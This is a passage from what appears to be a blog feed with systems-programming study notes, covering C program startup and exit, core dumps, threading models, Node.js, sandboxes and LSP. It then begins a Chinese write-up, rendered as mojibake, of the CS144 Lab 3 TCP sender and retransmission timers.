features.</li><li>Runs constructors for global objects (if using C++).</li><li>Sets up dynamic linking (if needed).</li></ul></li></ul></li><li><strong>Call <code>main()</code></strong>:<ul><li>After initialization, <code>__libc_start_main</code> calls <code>main()</code>:<br><code>int exit_code = main(argc, argv);</code></li></ul></li></ol><h4 id="step-4-main-executes-user-code"><a class="markdownIt-Anchor" href="#step-4-main-executes-user-code"></a> Step 4: <code>main()</code> Executes User Code</h4><ol><li>In our case, <code>main()</code> calls <code>printf</code>:<br><code>printf(&quot;Hello, World!\n&quot;);</code><ul><li><code>printf</code> formats the string and writes it to the standard output buffer.</li></ul></li><li>After <code>printf</code> finishes, <code>main()</code> returns 0.</li></ol><h4 id="step-5-cleanup-and-exit"><a class="markdownIt-Anchor" href="#step-5-cleanup-and-exit"></a> Step 5: Cleanup and Exit</h4><ol><li><strong>Return to <code>__libc_start_main</code></strong>:<ul><li>After <code>main()</code> returns, control goes back to <code>__libc_start_main</code>.</li></ul></li><li><strong>Call <code>exit()</code></strong>:<ul><li><code>__libc_start_main</code> calls the <code>exit()</code> function with the return value from <code>main()</code>:<br><code>exit(exit_code);</code></li></ul></li><li><strong>Perform Cleanup</strong>:<ul><li><code>exit()</code>:<ul><li>Runs functions registered with <code>atexit()</code>.</li><li>Flushes and closes all open streams.</li><li>Calls <code>_exit()</code> to terminate the process.</li></ul></li></ul></li><li><strong>Call <code>_exit()</code></strong>:<ul><li><code>_exit()</code> makes a system call (<code>exit_group</code> or <code>exit</code>) to notify the kernel that the process is terminating:<br><code>syscall(SYS_exit_group, exit_code);</code></li></ul></li></ol><h4 id="step-6-the-kernel-cleans-up"><a class="markdownIt-Anchor" href="#step-6-the-kernel-cleans-up"></a> Step 6: The Kernel Cleans Up</h4><ol><li>The kernel performs final cleanup:<ul><li>Reclaims memory and other resources used by the process.</li><li>Marks the process as terminated.</li></ul></li><li>The kernel updates the parent process (e.g., the shell) with the exit status of the terminated program.</li></ol><h3 id="summary-with-key-functions"><a class="markdownIt-Anchor" href="#summary-with-key-functions"></a> Summary with Key Functions</h3><p>Hereâ€™s the entire process mapped to the key functions:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. Parent process calls `execve(&quot;./hello&quot;, ...)` -&gt; Kernel loads the ELF binary.</span><br><span class="line">2. Kernel sets up process memory and jumps to `_start`. </span><br><span class="line">3. `_start` calls `__libc_start_main(main, ...)`. </span><br><span class="line">4. `__libc_start_main` initializes runtime and calls `main()`. </span><br><span class="line">5. `main()` runs user code and returns an exit code. </span><br><span class="line">6. `__libc_start_main` calls `exit(exit_code)`. </span><br><span class="line">7. `exit()` flushes streams, calls `_exit(exit_code)`. </span><br><span class="line">8. `_exit(exit_code)` makes a syscall to terminate the process. </span><br><span class="line">9. Kernel cleans up and updates the parent with the exit status.``</span><br></pre></td></tr></table></figure><p>This process illustrates how a simple program involves several layers of initialization, execution, and cleanup, seamlessly transitioning between user-level code and kernel-level actions.</p><h2 id="core-dumped"><a class="markdownIt-Anchor" href="#core-dumped"></a> Core dumped</h2><h3 id="what-is-a-core-dump"><a class="markdownIt-Anchor" href="#what-is-a-core-dump"></a> What is a Core Dump?</h3><p>A <strong>core dump</strong> is a file (snapshot) that captures the memory state of a running process at a specific point in time, usually when the program crashes due to a severe error like a <strong>segmentation fault</strong>. It contains:</p><ol><li><strong>Memory Contents</strong>: The contents of the programâ€™s memory (stack, heap, and data segments) at the time of the crash.</li><li><strong>Registers</strong>: The values in CPU registers.</li><li><strong>Execution Context</strong>: Information about the programâ€™s execution, such as the program counter and the instruction that caused the fault.</li><li><strong>Other Metadata</strong>: Details about the process, such as environment variables, command-line arguments, and signal information.</li></ol><h3 id="why-does-a-core-dump-file-need-to-be-generated"><a class="markdownIt-Anchor" href="#why-does-a-core-dump-file-need-to-be-generated"></a> Why Does a Core Dump File Need to Be Generated?</h3><p>A core dump is ideal when:</p><ul><li><strong>The program is no longer running</strong>: You canâ€™t attach a debugger because the process has terminated.</li><li><strong>The crash is hard to reproduce</strong>: Core dumps provide a snapshot of the fault, so you donâ€™t need to recreate the conditions leading to the crash.</li><li><strong>Sharing Debug Information</strong>: You can send the core dump to someone else (e.g., another developer or a support team) for analysis.</li></ul><h3 id="is-a-core-dump-necessary"><a class="markdownIt-Anchor" href="#is-a-core-dump-necessary"></a> Is a Core Dump Necessary?</h3><p>A core dump file is <strong>useful</strong> but <strong>not strictly necessary</strong> for debugging a program crash. It depends on your situation and debugging needs.</p><p>Use Core Dumps When:</p><ul><li>The process has already crashed and terminated.</li><li>The crash is <strong>difficult to reproduce.</strong></li><li>You need to analyze the fault <strong>on a different machine or share debugging data</strong>.</li></ul><p>Use GDB Without Core Dumps When:</p><ul><li>You can r<strong>eproduce the issue</strong> easily in your environment.</li><li>You want to interactively explore the programâ€™s state (e.g., set breakpoints before the crash).</li><li>Youâ€™re debugging a long-running or server process where <strong>capturing a live snapshot is more efficient</strong> than generating a dump.</li></ul><h2 id="user-level-and-kernel-level-multithreading"><a class="markdownIt-Anchor" href="#user-level-and-kernel-level-multithreading"></a> User-level and Kernel-level Multithreading</h2><p>The key difference between <strong>explicitly user-level thread libraries</strong> (e.g., <code>pthread</code> or <code>windows.h</code>) and <strong>implicitly kernel-level thread abstractions</strong> (e.g., thread pools, OpenMP, or GCD) lies in <strong>control granularity</strong> and <strong>abstraction level</strong>, which affects <strong>how threads are managed</strong> and <strong>who is responsible for managing them</strong>.</p><h3 id="1-user-level-thread-libraries-explicit-control"><a class="markdownIt-Anchor" href="#1-user-level-thread-libraries-explicit-control"></a> 1. User-Level Thread Libraries (Explicit Control)</h3><p>Examples: <code>pthread</code> (POSIX threads), <code>windows.h</code> (Windows threading API)</p><h4 id="characteristics"><a class="markdownIt-Anchor" href="#characteristics"></a> Characteristics:</h4><ul><li><strong>Explicit Thread Management:</strong><br>The programmer directly creates, manages, and synchronizes threads using APIs like <code>pthread_create</code>, <code>pthread_join</code>, or <code>CreateThread</code>.</li><li><strong>Fine-Grained Control:</strong><br>The library exposes lower-level primitives, allowing the programmer to:<ul><li>Decide when and how to create threads.</li><li>Explicitly synchronize threads with mutexes, condition variables, etc.</li><li>Handle thread termination and resource cleanup.</li></ul></li><li><strong>User-Space Scheduling:</strong><br>If implemented as purely user-level threads (like in the Many-to-One model), the kernel may not even be aware of these threads, and the thread library handles scheduling in user space. This provides lightweight thread management but can suffer from blocking issues.</li></ul><h3 id="2-kernel-level-thread-libraries-implicit-abstractions"><a class="markdownIt-Anchor" href="#2-kernel-level-thread-libraries-implicit-abstractions"></a> 2. Kernel-Level Thread Libraries (Implicit Abstractions)</h3><p>Examples: Thread pools, OpenMP (<code>omp.h</code>), Grand Central Dispatch (GCD)</p><h4 id="characteristics-2"><a class="markdownIt-Anchor" href="#characteristics-2"></a> Characteristics:</h4><ul><li><strong>Higher-Level Abstractions:</strong><br>These libraries or frameworks hide most of the low-level thread management details from the programmer. <u>Instead of directly managing threads, you typically submit <strong>task</strong> or use <strong>parallel constructs</strong>, and the system determines how threads are allocated</u>.</li><li><strong>Kernel-Managed Threads:</strong><br>These abstractions often rely on kernel threads for execution, meaning the kernel scheduler handles thread creation, termination, and context switching.</li><li><strong>Dynamic Resource Management:</strong><br>They dynamically adjust thread usage to match the available hardware resources (e.g., CPU cores) and workload. For example:<ul><li><strong>Thread pools</strong> reuse threads to minimize thread creation and destruction overhead.</li><li><strong>OpenMP</strong> dynamically distributes work across threads with constructs like <code>#pragma omp parallel for</code>.</li><li><strong>GCD</strong> (on Apple platforms) uses queues to schedule tasks onto kernel threads efficiently.</li></ul></li></ul><h3 id="why-they-seem-the-same-to-programmers"><a class="markdownIt-Anchor" href="#why-they-seem-the-same-to-programmers"></a> Why They â€œSeem the Sameâ€ to Programmers</h3><p>From a usability perspective, they may feel similar because:</p><ol><li>Both allow concurrent execution.</li><li>The higher-level abstractions are designed to make concurrency <strong>easier</strong>, hiding the underlying complexity.<br>However, the <strong>level of abstraction</strong> and <strong>degree of control</strong> are vastly different. If youâ€™re using <code>pthread</code>, youâ€™re <strong>explicitly</strong> in charge of the threads, while with something like OpenMP or GCD, youâ€™re simply defining tasks, and the <strong>framework/library manages everything else</strong>.</li></ol><hr><h1 id="ä¸€äº›æ¦‚å¿µ"><a class="markdownIt-Anchor" href="#ä¸€äº›æ¦‚å¿µ"></a> ä¸€äº›æ¦‚å¿µ</h1><h2 id="what-is-nodejs"><a class="markdownIt-Anchor" href="#what-is-nodejs"></a> What is Node.js</h2><p>Node.js is an open-source and cross-platform <strong>JavaScript runtime environment</strong>, used for executing JavaScript code outside of a web browser.</p><p>There are a number of characteristics that make Node.js what it is:</p><ul><li><strong>Google Chrome V8 JavaScript Engine:</strong>Â <u>This runtime environment is built on the Google Chrome V8 JavaScript runtime engine.</u> In the same way a Java Virtual Machine translates bytecode, the Chrome V8 JavaScript engine takes JavaScript and makes it readable.</li><li><strong>Modules/Packages:</strong>Â Node.js has npm, a node package manager, with a library of over 350,000 packages to help get your project or application off the ground with efficiency and ease.</li><li><strong>Event Driven, Single-Threaded I/O Model:</strong>Â <u>JavaScript relies on user interactions or events to run. </u>In most cases, code is run synchronously. Server requests and other such asynchronous tasks rely on a system of promises or async/await functions to handle these inputs and outputs.</li></ul><h2 id="what-is-sandbox"><a class="markdownIt-Anchor" href="#what-is-sandbox"></a> What is Sandbox</h2><blockquote><p>InÂ <a href="https://en.wikipedia.org/wiki/Computer_security" title="Computer security">computer security</a>, aÂ <em>sandbox</em>Â is a security mechanism for separating running programs, usually in an effort to mitigate system failures and/or softwareÂ vulnerabilities from spreading.</p><p>TheÂ â€œsandboxâ€Â metaphor derives from the concept of a childâ€™s sandboxâ€”a play area where kids can build, destroy, and experiment without causing any real-world damage.</p></blockquote><h2 id="language-server-protocol-lsp"><a class="markdownIt-Anchor" href="#language-server-protocol-lsp"></a> Language Server Protocol (LSP)</h2><p>In the context of the Language Server Protocol (LSP), â€œclientâ€ and â€œserverâ€ refer to the two main components involved in the communication and execution of language-related tasks.</p><ol><li><strong>Client</strong>: The client is typically an editor or integrated development environment (IDE) like Visual Studio Code, Vim, or any other text editor that supports LSP. <strong>The client is responsible for initiating requests for language features</strong> such as autocomplete, syntax highlighting, go-to-definition, and error-checking. In short, the client sends requests to the server to receive language-specific functionality and displays the results to the user.</li><li><strong>Server</strong>: The server is the language server, which provides language-specific information and features. <strong>It could be a standalone application or a process initiated by the client.</strong> The server responds to client requests by providing data and functionalities like code completion, diagnostics, and symbol information based on the programming language itâ€™s tailored for (e.g., Python, JavaScript, or C++). The server operates by analyzing the code, managing the workspace, and returning relevant information back to the client.</li></ol><p>This client-server architecture in LSP enables any editor that implements an LSP client to interact with multiple language servers, making it a highly flexible and language-agnostic solution for language support in editors.</p><hr><h1 id="ä¸€äº›æ€è€ƒ"><a class="markdownIt-Anchor" href="#ä¸€äº›æ€è€ƒ"></a> ä¸€äº›æ€è€ƒ</h1><blockquote><p>å¾ˆå¤šæ—¶å€™, ä½ ä¼šè§‰å¾—ç†è§£æŸä¸€ä¸ªçŸ¥è¯†ç‚¹æ˜¯ä¸€ä»¶ç®€å•æ˜¯äº‹æƒ…, ä½†å½“ä½ çœŸæ­£åŠ¨æ‰‹å®è·µçš„æ—¶å€™, ä½ æ‰å‘ç°ä½ çš„ä¹‹å‰çš„ç†è§£åªæ˜¯åœç•™åœ¨è¡¨é¢.</p></blockquote><blockquote><p>One of the most important spirits of young people like you is to try new things to bade farewell to the past.</p></blockquote><blockquote><p>Remember,Â learn to useÂ <code>man</code>, learn to use everything. RTFM</p></blockquote><blockquote><p>æ— è®ºä½•äººè¦è®¤è¯†ä»€ä¹ˆäº‹ç‰©ï¼Œé™¤äº†åŒé‚£ä¸ªäº‹ç‰©æ¥è§¦ï¼Œå³ç”Ÿæ´»äºï¼ˆå®è·µäºï¼‰é‚£ä¸ªäº‹ç‰©çš„ç¯å¢ƒä¸­ï¼Œæ˜¯æ²¡æœ‰æ³•å­è§£å†³çš„ã€‚</p><p>â€œç§€æ‰ä¸å‡ºé—¨ï¼Œå…¨çŸ¥å¤©ä¸‹äº‹â€ï¼Œåœ¨æŠ€æœ¯ä¸å‘è¾¾çš„å¤ä»£åªæ˜¯ä¸€å¥ç©ºè¯ï¼Œåœ¨æŠ€æœ¯å‘è¾¾çš„ç°ä»£è™½ç„¶å¯ä»¥å®ç°è¿™å¥è¯ï¼Œç„¶è€ŒçœŸæ­£äº²çŸ¥çš„æ˜¯å¤©ä¸‹å®è·µç€çš„äººï¼Œé‚£äº›äººåœ¨ä»–ä»¬çš„å®è·µä¸­é—´å–å¾—äº†â€œçŸ¥â€ï¼Œç»è¿‡æ–‡å­—å’ŒæŠ€æœ¯çš„ä¼ è¾¾è€Œè¾¾åˆ°äºâ€œç§€æ‰â€ä¹‹æ‰‹ï¼Œç§€æ‰ä¹ƒèƒ½é—´æ¥åœ°â€œçŸ¥å¤©ä¸‹äº‹â€ã€‚å¦‚æœè¦ç›´æ¥åœ°è®¤è¯†æŸç§æˆ–æŸäº›äº‹ç‰©ï¼Œä¾¿åªæœ‰äº²èº«å‚åŠ äºå˜é©ç°å®ã€å˜é©æŸç§æˆ–æŸäº›äº‹ç‰©çš„å®è·µçš„æ–—äº‰ä¸­ï¼Œæ‰èƒ½è§¦åˆ°é‚£ç§æˆ–é‚£äº›äº‹ç‰©çš„ç°è±¡ï¼Œä¹Ÿåªæœ‰åœ¨äº²èº«å‚åŠ å˜é©ç°å®çš„å®è·µçš„æ–—äº‰ä¸­ï¼Œæ‰èƒ½æš´éœ²é‚£ç§æˆ–é‚£äº›äº‹ç‰©çš„æœ¬è´¨è€Œç†è§£ä»–ä»¬ã€‚ â€”â€”ã€Šå®è·µè®ºã€‹</p></blockquote><blockquote><p>å®è·µï¼Œè®¤è¯†ï¼Œå†å®è·µï¼Œå†è®¤è¯†ã€‚ â€”â€”ã€Šå®è·µè®ºã€‹</p><ol><li>æ„Ÿæ€§åˆ°ç†æ€§ã€è®¤çŸ¥å‘ç†è®ºå‘å±•çš„è¿‡ç¨‹</li><li>ç†è®ºè®¤çŸ¥å’Œå®è·µç»éªŒçš„è¾©è¯å…³ç³»</li><li>è®¤çŸ¥å’Œå®è·µçš„å±€é™æ€§ã€è¿åŠ¨æ€§<br>â€œæŸä¸€å†å²æ—¶æœŸä¸‹çš„æŸä¸€å®è·µè¿‡ç¨‹â€</li></ol></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;preface&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#preface&quot;&gt;&lt;/a&gt; Preface&lt;/h1&gt;
&lt;p&gt;æˆ‘å¾ˆå–œæ¬¢å§œå¤”è¯—ã€Šæš—é¦™ã€‹ä¸­çš„ä¸€å¥è¯ï¼šâ€œç­‰ææ—¶ã€é‡è§…å¹½é¦™ï¼Œå·²å…¥å°çª—æ¨ªå¹…â€ã€‚èº«å¤„åœ¨è®¸å¤šä¸ªâ€œå½“æ—¶â€çš„æˆ‘å¹¶æœªèƒ½å¾ˆå¥½åœ°æŠŠæ¡å¥½å½“</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Standford CS144 Lab 3</title>
    <link href="http://example.com/2024/12/12/CS144-Lab3/"/>
    <id>http://example.com/2024/12/12/CS144-Lab3/</id>
    <published>2024-12-12T13:07:39.704Z</published>
    <updated>2024-12-12T13:08:45.694Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a class="markdownIt-Anchor" href="#å‰è¨€"></a> å‰è¨€</h1><p>æ—¶éš”ä¸€ä¸ªæœˆåˆé‡æ–°å›åˆ°äº† CS144 çš„å®éªŒå½“ä¸­ï¼Œä¹‹æ‰€ä»¥åšå¾—å¦‚æ­¤ä¹‹æ…¢ï¼Œä¸»è¦åŸå› è¿˜æ˜¯è‡ªå·±èƒ½åŠ›ä¸å¤Ÿï¼ˆèœæ˜¯åŸç½ªï¼‰ã€‚æœ‰æ—¶ä»¥ä¸ºè‡ªå·±ä»â€œæ„Ÿæ€§è®¤çŸ¥â€ä¸Šå‡åˆ°äº†â€œç†æ€§è®¤çŸ¥â€ï¼Œä½†å°†å…¶è¿ç”¨åˆ°å®è·µä¸­æ—¶æ‰å‘ç°ï¼ŒåŸæ¥æˆ‘è¿˜æ˜¯ä»€ä¹ˆéƒ½ä¸æ‡‚ï¼Œä¾æ—§åœç•™åœ¨å‘å±•é˜¶æ®µã€‚æŠ€æœ¯å€ºæ–¹é¢ï¼ŒèŠ±äº†ä¸€å‘¨å¤šè¡¥äº† <em>Git</em> çš„ç†è®ºæ“ä½œï¼›çŸ¥è¯†å€ºæ–¹é¢ï¼Œè¿˜åœ¨ç»§ç»­è¾¹åšå®éªŒè¾¹é€šè¿‡è‡ªé¡¶å‘ä¸‹å¤ä¹ ï¼ˆç”šè‡³å¯ä»¥è¯´æ˜¯å­¦ä¹ ï¼‰ã€‚è®¤çŸ¥å’Œå®è·µæ˜¯æ— æ³•å‰²è£‚å¼€æ¥çš„ï¼Œå­¦ä¹ ä¹Ÿæ˜¯å¦‚æ­¤ã€‚åŒæ—¶ä¹Ÿè¦è®¤è¯†åˆ°è®¤çŸ¥ã€ç†è®ºå’Œå®è·µéƒ½å…·æœ‰æ—¶é—´å±€éƒ¨æ€§ï¼Œå”¯ä¸€ä¸å˜çš„å°±æ˜¯â€œå˜â€ï¼ŒæƒŸå…¶å¦‚æ­¤ï¼Œæ‰éœ€è¦è®¤çŸ¥ï¼Œå®è·µï¼Œå†è®¤çŸ¥ï¼Œå†å®è·µã€‚</p><h1 id="å®éªŒæ¦‚è¿°"><a class="markdownIt-Anchor" href="#å®éªŒæ¦‚è¿°"></a> å®éªŒæ¦‚è¿°</h1><p><img src="/2024/12/12/CS144-Lab3/%E6%A1%86%E6%9E%B6.png" alt="æ¡†æ¶"><br>å®éªŒä¸€å¼€å§‹æˆ‘å¹¶æ²¡æœ‰å¯¹è¿™ä¸ªç»“æ„å›¾æœ‰æ¯”è¾ƒæ¸…æ™°çš„è®¤è¯†ï¼Œä½†åšåˆ°åé¢æ…¢æ…¢åœ°å‘ç°å®ƒå®åœ¨æ˜¯ç²¾ç‚¼åœ°æç»˜äº†æ•´ä¸ª TCP Socketã€‚</p><p>ç”±äº TCP æ˜¯å…¨åŒå·¥çš„ (bidiretional)ï¼Œæ‰€ä»¥åœ¨ TCP è¿æ¥çš„å‘èµ·æ–¹ï¼ˆå‘é€æ–¹ï¼‰ä»¥åŠè¿æ¥çš„å“åº”æ–¹ï¼ˆæ¥å—æ–¹ï¼‰éƒ½æ˜¯æœ‰<code>Sender</code>å’Œ<code>Reciever</code>ä¸¤ä¸ªéƒ¨ä»¶çš„ï¼Œä¸è¿‡ä¸ºäº†ç®€åŒ–è®¨è®ºï¼Œå°±æš‚ä¸”ç§°å‰è€…ä¸ºå‘é€æ–¹è€Œåè€…ä¸ºæ¥æ”¶æ–¹ã€‚åœ¨ Lab1 å’Œ Lab2 ä¸­æˆ‘ä»¬å®ç°äº†<code>Receiver</code>éƒ¨ä»¶ï¼Œåœ¨ Lab3 ä¸­æˆ‘ä»¬å°±å°†å®ç°<code>Sender</code>éƒ¨ä»¶ã€‚</p><h1 id="sender-éƒ¨ä»¶"><a class="markdownIt-Anchor" href="#sender-éƒ¨ä»¶"></a> Sender éƒ¨ä»¶</h1><p>ä»¥ä¸‹ä»‹ç»çš„<code>Sender</code>éƒ¨ä»¶æ¶‰åŠä¸€èˆ¬å®ç°çš„è€ƒè™‘ï¼Œè€Œé CS144 çš„å®éªŒè¦æ±‚ã€‚</p><h2 id="1-ä¸Šå±‚è°ƒç”¨"><a class="markdownIt-Anchor" href="#1-ä¸Šå±‚è°ƒç”¨"></a> 1. ä¸Šå±‚è°ƒç”¨</h2><p><code>Sender</code>çš„å…·ä½“åŠ¨ä½œæ˜¯äº‹ä»¶é©±åŠ¨çš„ (event-based)ã€‚<strong>ä¸Šå±‚è°ƒç”¨ socket æ¥å£å†™å…¥æ•°æ®ï¼ˆäº‹ä»¶ 1ï¼‰</strong>ï¼Œæ­¤æ—¶<code>Sender</code>åº”è¯¥æ¥å—æ•°æ®ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“åœ¨æµé‡æ§åˆ¶æœºåˆ¶ä¸‹ï¼Œ<code>Sender</code>ä¼šç»´æŠ¤ä¸€ä¸ªæ¥æ”¶æ–¹<code>Receiver</code>çš„æ»‘åŠ¨çª—å£ï¼Œå¦‚æœæ­¤æ—¶çª—å£å·²ç»æ»¡äº†ï¼Œé‚£ä¹ˆ<code>Sender</code>æ˜¯æ— æ³•å‘é€æ–°çš„åˆ†ç»„çš„ï¼Œæ­¤æ—¶å®ƒæœ‰ä¸‰ç§å“åº”åŠæ³•ï¼š</p><ol><li>ç›´æ¥æ‹’ç»ä¸Šå±‚çš„è°ƒç”¨è¯·æ±‚</li><li>é€šè¿‡ä¿¡å·é‡å’Œä¸Šå±‚è¿›è¡ŒåŒæ­¥</li><li>å°†æ•°æ®ç¼“å­˜åœ¨<code>Receiver</code>çš„ç¼“å†²åŒºä¸­</li></ol><p>å¦‚æœæ­¤æ—¶çª—å£æ²¡æœ‰æ»¡ï¼Œ<code>Sender</code>æ¥å—æ•°æ®åç›´æ¥å°†å…¶å°è£…æˆä¸€ä¸ªåˆ†ç»„å¹¶å‘é€ã€‚æ—¢ç„¶è¦åœ¨ä¸å¯é çš„ IP ç½‘ç»œä¸Šå‘é€ä¸€ä¸ªåˆ†ç»„ï¼Œæˆ‘ä»¬åŒæ—¶éœ€è¦ä¸€ç§<strong>è¶…æ—¶é‡ä¼ æœºåˆ¶</strong>æ¥ä¿è¯æ•°æ®å‘é€åˆ°æ¥å—æ–¹æ˜¯å®Œæ•´çš„ã€æŒ‰åºçš„ï¼Œè€Œè¶…æ—¶é‡ä¼ æœºåˆ¶çš„å®ç°éƒ¨ä»¶å°±æ˜¯<code>Timer</code>å€’è®¡æ—¶å™¨ã€‚æ ¹æ®ä¸åŒçš„é‡ä¼ æœºåˆ¶ï¼Œæˆ‘ä»¬æœ‰ä¸åŒçš„<code>Timer</code>ä½¿ç”¨æ–¹æ³•ï¼š</p><ol><li><strong>GBN (Go Back N steps)</strong>ï¼šç»´æŠ¤ä¸€ä¸ª<code>Timer</code>ï¼ŒæŒ‡ç¤ºçš„æ˜¯æœ€æ—©çš„å‘é€åè¿˜æœªç¡®è®¤çš„åˆ†ç»„ï¼Œå¦‚æœè¶…æ—¶åˆ™é‡ä¼ æ»‘åŠ¨çª—å£å†…çš„æ‰€æœ‰ N ä¸ªåˆ†ç»„ã€‚è¿™ç§ç­–ç•¥çš„ç¼ºç‚¹å¾ˆæ˜æ˜¾ï¼šå› ä¸ºå‘é€é˜Ÿåˆ—ä¸­çš„ä¸€ä¸ªåˆ†ç»„çš„ä¸¢åŒ…è€Œé‡ä¼ æ‰€æœ‰åˆ†ç»„ï¼Œä¸è®ºæ˜¯å¦è¢«æ¥æ”¶æ–¹æ­£ç¡®æ¥å—ï¼Œè¿™äº›å†—ä½™çš„åˆ†ç»„æå¤§åœ°æµªè´¹äº†ç½‘ç»œèµ„æºã€‚</li><li><strong>SR (Selective Retransmission)</strong>ï¼šä¸ºæ¯ä¸€ä¸ªåˆ†ç»„ç»´æŠ¤ä¸€ä¸ªç‹¬ç«‹çš„<code>Timer</code>ï¼Œå“ªä¸ªåˆ†ç»„è¶…æ—¶äº†å°±é€‰æ‹©åœ°å»é‡ä¼ ï¼Œè™½ç„¶è§£å†³äº†ä¸€éƒ¨åˆ† GBN çš„é—®é¢˜ï¼Œä½†ä½¿å®ç°æ›´åŠ å¤æ‚ï¼ŒåŒæ—¶ç»´æŠ¤ä¼—å¤š<code>Timer</code>ä¹Ÿé€ æˆäº†å¾ˆå¤§çš„å¼€é”€ã€‚</li></ol><p>åœ¨ TCP çš„ä¸€èˆ¬å®ç°ä¸­ï¼Œé‡‡ç”¨çš„æ˜¯ GBN å’Œ SR æ··åˆçš„ä¸€ç§é‡ä¼ æœºåˆ¶ã€‚å›åˆ°åˆšåˆšçš„æƒ…å†µä¸­ï¼Œæˆ‘ä»¬å‘é€å®Œæ–°çš„åˆ†ç»„åï¼Œéœ€è¦è€ƒè™‘æ˜¯å¦è¦å¯åŠ¨<code>Timer</code>ï¼šå¦‚æœæ­¤æ—¶<code>Timer</code>æ²¡æœ‰å¯åŠ¨ï¼Œè¯´æ˜è¿™ä¸ªæ–°å‘é€çš„åˆ†ç»„ä¹‹å‰çš„æ‰€æœ‰åˆ†ç»„éƒ½å·²ç»ç¡®è®¤äº†ï¼ˆcumulative acknowledgeï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´ç½‘ç»œä¸­æ²¡æœ‰åœ¨å‘é€è¿˜æ²¡æœ‰è¢«æ¥æ”¶æ–¹ç¡®è®¤çš„åˆ†ç»„ (outstanding packets)ï¼Œæ­¤æ—¶å¯åŠ¨<code>Timer</code>å¼€å§‹ä¸ºè¿™ä¸ªåˆ†ç»„è®¡æ—¶ã€‚</p><h2 id="2-timer-è¿‡æœŸ"><a class="markdownIt-Anchor" href="#2-timer-è¿‡æœŸ"></a> 2. Timer è¿‡æœŸ</h2><p><strong><code>Timer</code>è®¡æ—¶ç»“æŸï¼ˆäº‹ä»¶ 2ï¼‰</strong>ï¼Œä¼šäº§ç”Ÿä¸€ä¸ªä¸­æ–­æ¥å‘Šè¯‰<code>Sender</code>éœ€è¦é‡ä¼ åˆ†ç»„ã€‚å‰é¢æåˆ° TCP çš„ä¸€èˆ¬å®ç°æ˜¯ GBN å’Œ SR çš„æ··åˆï¼Œåœ¨éœ€è¦é‡ä¼ åˆ†ç»„æ—¶ï¼Œåªä¼šé‡ä¼ æœ€æ—©çš„æœªè¢«ç¡®è®¤çš„åˆ†ç»„ï¼ˆè€Œé GBN çš„ N ä¸ªåˆ†ç»„ï¼‰ï¼ŒåŒæ—¶é‡å¯<code>Timer</code>ã€‚</p><p>ä¸€ä¸ªè¶…æ—¶é‡ä¼ æœºåˆ¶é™¤äº†<code>Timer</code>éƒ¨ä»¶çš„ä½¿ç”¨ï¼Œè¿˜åº”è¯¥å®Œå–„åœ°è§„å®šè¶…æ—¶çš„æ—¶é—´é—´éš”ï¼šè¿ç”¨ç»Ÿè®¡å­¦çš„æ–¹æ³•ï¼Œé€šè¿‡æ¥å—æ¯ä¸€ä¸ªåˆ†ç»„æˆ‘ä»¬å¯ä»¥è®¡ç®—ä¸€ä¸ªæ ·æœ¬ RTT å€¼ (SampleRTT)ï¼Œé€šè¿‡æŒ‡æ•°åŠ æƒç§»åŠ¨å¹³å‡ (Exponential Weighted Moving Average, EWMA) è®¡ç®—ä¸‹ä¸€ä¸ª RTO å€¼ï¼š</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mi>s</mi><mi>t</mi><mi>i</mi><mi>m</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>d</mi><mi>R</mi><mi>T</mi><mi>T</mi><mo>=</mo><mo stretchy="false">(</mo><mn>1</mn><mo>âˆ’</mo><mi>Î±</mi><mo stretchy="false">)</mo><mo>âˆ—</mo><mi>E</mi><mi>s</mi><mi>t</mi><mi>i</mi><mi>m</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>d</mi><mi>R</mi><mi>T</mi><mi>T</mi><mo>+</mo><mi>Î±</mi><mo>âˆ—</mo><mi>S</mi><mi>a</mi><mi>m</mi><mi>p</mi><mi>l</mi><mi>e</mi><mi>R</mi><mi>T</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">EstimatedRTT = (1-Î±)*EstimatedRTT + Î±*SampleRTT</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">Î±</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" 